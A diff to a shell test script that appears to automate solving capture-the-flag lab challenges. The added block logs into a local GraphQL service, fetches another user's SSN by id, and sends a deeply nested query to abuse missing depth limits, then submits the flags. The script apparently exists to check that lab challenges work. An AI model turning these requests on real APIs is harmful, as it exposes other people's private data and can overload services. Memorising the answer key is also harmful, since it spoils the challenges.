@@ -151,5 +151,16 @@ if [ -n "${S:-}" ]; then
   submit forge-reset "$S" "$F" | grep -q '"correct":true' && ok "reset forge → flag accepted" || bad "crypto solve" "$F"
   destroy "$S"
 fi
+
+L=$(launch api-graphql-01); S=$(echo "$L" | J "d['id']"); P=$(echo "$L" | J "d['targets'][0]['port']") || { bad "graphql launch" "$L"; S=""; }
+if [ -n "${S:-}" ]; then
+  TOK=$(curl -s -X POST "http://127.0.0.1:$P/login" -H 'Content-Type: application/json' -d '{"username":"alice"}' | J "d['token']")
+  F1=$(curl -s -X POST "http://127.0.0.1:$P/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d '{"query":"query{user(id:\"2\"){id ssn}}"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['user'].get('flag_ssn',''))")
+  submit graphql-ssn "$S" "$F1" | grep -q '"correct":true' && ok "GraphQL ssn → flag accepted" || bad "graphql ssn" "$F1"
+  DEEP=$(python3 -c "import json;print(json.dumps({'query':'query'+'{user'*6+'(id:\"1\"){id}'+'}'*6}))")
+  F2=$(curl -s -X POST "http://127.0.0.1:$P/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d "$DEEP" | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['user'].get('flag_deep',''))")
+  submit graphql-deep "$S" "$F2" | grep -q '"correct":true' && ok "GraphQL depth → flag accepted" || bad "graphql deep" "$F2"
+  destroy "$S"
+fi
 echo "== $PASS passed, $FAIL failed =="
 [ "$FAIL" = "0" ]
